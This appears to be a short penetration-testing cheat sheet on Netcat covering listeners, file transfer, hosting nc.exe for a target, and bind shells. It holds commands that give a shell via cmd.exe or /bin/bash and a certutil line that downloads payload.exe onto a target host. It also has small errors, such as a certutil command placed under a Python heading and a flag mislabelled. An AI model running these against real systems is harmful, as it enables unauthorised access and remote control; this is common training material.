## **Intro:**
Netcat is a networking utility used to read and write data to network connections using TCP or UDP.


Netcat utilizes a client-server communication architecture with 2 modes:

- Client mode: Used to connect to any TCP/UDP port as well as Netcat listener (listener).
- Server mode: Used to listen for connections from clients on a specific port.

Netcat most used for: 
1. Banner Grabbing.
2. Port Scanning.
3. Transferring Files.
4. Bind/Reverse Shells.



# **How to send nc.exe to our target:**

There's a EB for windows on Kali\:

	/usr/share/windows-binaries/nc.exe

we can host this file and download it to our target but you need to be in that folder:

	python -m SimpleHTTPServer 80



# **Setup a listener:**

`-n` No dns reselution
`-v` Verbose
`-l` Listen
`-p` specify a port to listen
`-e` Specify a program to be executed (E.g. in windows we want 'cmd.exe' or 'powershell.exe' to get a shell)


	nc -nvlp <port_to_listen_on> <ip>



# **Send and receive files with nc:**

Setup a listener at the receiving system (windows) 
- use the `>` to indicate you want to receive

		nc.exe -nvlp 7777 > <any_name_for_file>

Now connect to that port on the windows IP and specify the file you want to send when connecting: 
- use the `<` to indicate you want to send

		nc -nv 7777 <windows_ip> < <Actual_filename_to_send>


### OR with Python:


	certutil -urlcache -f http://10.10.45.3/payload.exe payload.exe

---

# **Setup a Bind Shell:**

On a windows system:
>`-e` used to specify a program to be executed when anyone connect to this listener... 

	nc.exe -nvlp 7777 -e cmd.exe



On a Linux system:
> `-s` Used to specify a shell to be executed when anyone connect to this Listener...

	nc -nvlp 1234 -c /bin/bash
